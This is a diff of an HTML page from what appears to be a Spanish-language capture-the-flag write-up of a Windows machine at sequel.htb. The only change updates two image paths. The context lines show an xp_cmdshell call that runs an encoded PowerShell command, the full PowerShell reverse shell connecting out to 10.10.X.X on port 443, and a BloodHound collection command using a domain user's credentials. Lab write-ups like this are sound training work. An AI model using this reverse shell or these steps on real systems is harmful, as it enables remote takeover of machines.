@@ -349,7 +349,7 @@ SQL&gt; xp_cmdshell powershell <span class="nt">-e</span> JABjAGwAaQBlAG4AdAAgAD
 <span class="nv">$client</span> <span class="o">=</span> New-Object System.Net.Sockets.TCPClient<span class="o">(</span><span class="s1">'10.10.X.X'</span>,443<span class="o">)</span><span class="p">;</span><span class="nv">$stream</span> <span class="o">=</span> <span class="nv">$client</span>.GetStream<span class="o">()</span><span class="p">;</span><span class="o">[</span>byte[]]<span class="nv">$bytes</span> <span class="o">=</span> 0..65535|%<span class="o">{</span>0<span class="o">}</span><span class="p">;</span><span class="k">while</span><span class="o">((</span><span class="nv">$i</span> <span class="o">=</span> <span class="nv">$stream</span>.Read<span class="o">(</span><span class="nv">$bytes</span>, 0, <span class="nv">$bytes</span>.Length<span class="o">))</span> <span class="nt">-ne</span> 0<span class="o">){</span><span class="p">;</span><span class="nv">$data</span> <span class="o">=</span> <span class="o">(</span>New-Object <span class="nt">-TypeName</span> System.Text.ASCIIEncoding<span class="o">)</span>.GetString<span class="o">(</span><span class="nv">$bytes</span>,0, <span class="nv">$i</span><span class="o">)</span><span class="p">;</span><span class="nv">$sendback</span> <span class="o">=</span> <span class="o">(</span>iex <span class="nv">$data</span> 2&gt;&amp;1 | Out-String <span class="o">)</span><span class="p">;</span><span class="nv">$sendback2</span>  <span class="o">=</span> <span class="nv">$sendback</span> + <span class="s1">'PS '</span> + <span class="o">(</span><span class="nb">pwd</span><span class="o">)</span>.Path + <span class="s1">'&gt; '</span><span class="p">;</span><span class="nv">$sendbyte</span> <span class="o">=</span> <span class="o">([</span>text.encoding]::ASCII<span class="o">)</span>.GetBytes<span class="o">(</span><span class="nv">$sendback2</span><span class="o">)</span><span class="p">;</span><span class="nv">$stream</span>.Write<span class="o">(</span><span class="nv">$sendbyte</span>,0,<span class="nv">$sendbyte</span>.Length<span class="o">)</span><span class="p">;</span><span class="nv">$stream</span>.Flush<span class="o">()}</span><span class="p">;</span><span class="nv">$client</span>.Close<span class="o">()</span>
 </code></pre></div></div>
 
-<p><img src="/assets/reverse.png" alt="Gaining Access" /></p>
+<p><img src="/assets/img/reverse.png" alt="Gaining Access" /></p>
 
 <h1 id="escalada-de-privilegios">Escalada de Privilegios</h1>
 <hr />
@@ -428,7 +428,7 @@ Evil-WinRM shell v3.5
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bloodhound-python <span class="nt">-d</span> sequel.htb <span class="nt">-c</span> All <span class="nt">-ns</span> 10.10.11.51 <span class="nt">--zip</span> <span class="nt">-u</span> <span class="s1">'ryan'</span> <span class="nt">-p</span> <span class="s1">'WqS...'</span>
 </code></pre></div></div>
 
-<p><img src="/assets/bloodhound_1.png" alt="Bloodhound analysis" /></p>
+<p><img src="/assets/img/bloodhound_1.png" alt="Bloodhound analysis" /></p>
 
 <h2 id="abusing-dacl---writeowner-privilege">Abusing DACL - <code class="language-plaintext highlighter-rouge">WriteOwner</code> Privilege</h2>
 
